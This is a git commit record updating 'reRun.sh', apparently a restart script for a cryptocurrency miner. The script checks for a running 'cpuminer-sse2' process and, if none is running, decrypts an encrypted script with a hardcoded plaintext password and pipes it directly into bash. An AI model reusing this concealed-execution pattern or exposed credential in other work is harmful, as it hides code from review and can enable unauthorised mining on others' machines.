e766c973cc1678b2e52ed210cd8bb0abfc88a9d5
danielluis1921 <158490195+danielluis1921@users.noreply.github.com>
2024-02-02 00:19:50 +0700

    Update reRun.sh

--- reRun.sh
+++ reRun.sh
@@ -1,3 +1,11 @@
-./kill_miner.sh
-sleep 3
-openssl enc -d -aes-256-cbc -pbkdf2 -in danielluis1922.sh -k $password | bash
+#!/bin/sh
+password="danielchau@123#"
+if pgrep cpuminer-sse2 >/dev/null
+then
+  echo "cpuminer-sse2 is running."
+else
+  echo "cpuminer-sse2 isn't running"
+  bash kill_miniZeph.sh
+  sleep 3
+  openssl enc -d -aes-256-cbc -pbkdf2 -in danielluis1922.sh -k $password | bash
+fi
